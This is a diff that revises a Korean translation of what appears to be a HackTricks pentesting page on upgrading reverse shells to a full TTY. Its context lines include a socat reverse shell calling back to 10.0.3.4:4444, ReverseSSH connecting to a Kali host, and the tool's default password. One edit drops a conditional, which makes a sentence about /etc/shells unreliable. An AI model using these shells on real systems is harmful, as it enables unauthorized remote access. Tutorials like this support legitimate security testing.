@@ -23,7 +23,7 @@ Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and 
 
 ## Full TTY
 
-`SHELL` 변수에 설정한 셸은 **반드시** _**/etc/shells**_에 **목록에 있어야** 하며, 그렇지 않으면 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`라는 메시지가 표시됩니다. 또한, 다음 스니펫은 bash에서만 작동합니다. zsh에 있는 경우 `bash`를 실행하여 셸을 얻기 전에 bash로 변경하십시오.
+`SHELL` 변수에 설정한 셸은 **반드시** _**/etc/shells**_에 **목록에 있어야** 하며, `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`라는 메시지가 표시됩니다. 또한, 다음 스니펫은 bash에서만 작동합니다. zsh에 있는 경우 `bash`를 실행하여 셸을 얻기 전에 bash로 변경하십시오.
 
 #### Python
 
@@ -75,7 +75,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 **대화형 쉘 접근** 및 **파일 전송**과 **포트 포워딩**을 위한 편리한 방법은 정적으로 연결된 ssh 서버 [ReverseSSH](https://github.com/Fahrj/reverse-ssh)를 타겟에 배포하는 것입니다.
 
-아래는 upx로 압축된 바이너리를 사용하는 `x86`의 예입니다. 다른 바이너리에 대해서는 [릴리스 페이지](https://github.com/Fahrj/reverse-ssh/releases/latest/)를 확인하세요.
+아래는 `x86`용 upx 압축 바이너리의 예입니다. 다른 바이너리에 대해서는 [릴리스 페이지](https://github.com/Fahrj/reverse-ssh/releases/latest/)를 확인하세요.
 
 1. ssh 포트 포워딩 요청을 수신하기 위해 로컬에서 준비합니다:
 
@@ -110,7 +110,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* ReverseSSH 포트 포워딩 요청이 성공했다면, 이제 `reverse-ssh(.exe)`를 실행하는 사용자의 컨텍스트에서 기본 비밀번호 `letmeinbrudipls`로 로그인할 수 있어야 합니다:
+* ReverseSSH 포트 포워딩 요청이 성공적이었다면, 이제 `reverse-ssh(.exe)`를 실행하는 사용자의 컨텍스트에서 기본 비밀번호 `letmeinbrudipls`로 로그인할 수 있어야 합니다:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -146,7 +146,7 @@ GCP 해킹 배우기 및 연습하기: <img src="../../.gitbook/assets/grte.png"
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
